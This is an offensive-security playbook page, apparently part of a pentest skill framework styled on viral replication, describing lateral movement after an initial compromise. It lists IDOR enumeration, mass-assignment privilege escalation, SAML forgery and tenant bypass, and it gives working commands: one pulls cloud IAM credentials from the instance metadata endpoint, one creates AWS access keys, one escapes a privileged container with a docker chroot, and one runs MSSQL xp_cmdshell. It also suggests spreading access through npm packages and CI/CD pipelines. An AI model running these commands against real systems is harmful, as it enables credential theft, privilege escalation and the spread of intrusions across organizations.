# Stage 6: Budding — Lateral Movement

> Partikel virus baru keluar dan infeksi sel tetangga.
> Tiap foothold baru = infected cell baru. Self-replicating access.

## Budding Principle

Goal bukan A→B. Goal: infected cells di seluruh environment.
Setiap compromise baru = origin baru untuk spread lebih lanjut.

## Within-Application

```
IDOR → access other user accounts
→ enumerate IDs: /api/users/1, /api/users/2...
→ UUID predict or brute from known IDs

Privilege escalation:
→ mass assignment {"isAdmin": true, "role": "admin"}
→ parameter in hidden field
→ race condition on role check

Tenant bypass:
→ X-Tenant-ID header manipulation
→ JWT org claim manipulation
→ IDOR across org boundaries
```

## Cross-Application (Same Org)

```
SSO:
→ Compromise one app → SSO to all others
→ SAML assertion forgery
→ OAuth implicit flow abuse

Shared credentials:
→ Password reuse across apps
→ Shared service account
→ Shared API key (one key multiple apps)
```

## Infrastructure Pivot

```bash
# Cloud IAM escalation
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name [role]
# If has iam:CreateAccessKey:
aws iam create-access-key --user-name [user]

# Container escape
cat /proc/1/cgroup | grep docker  # detect container
# If privileged:
docker run -v /:/host --rm -it ubuntu chroot /host

# Database lateral
# SQLi → read creds from config table → connect to linked DB server
# MSSQL: exec xp_cmdshell 'whoami'
```

## Supply Chain Budding

```
npm package access → spreads to all importers
CI/CD access → infects every build
Developer machine → all their repos
Shared library → all services using it

Most powerful budding: automatic spread via legitimate channels.
```

*Stage 6: Budding/Lateral Movement | HIV Framework | Security--Skill*
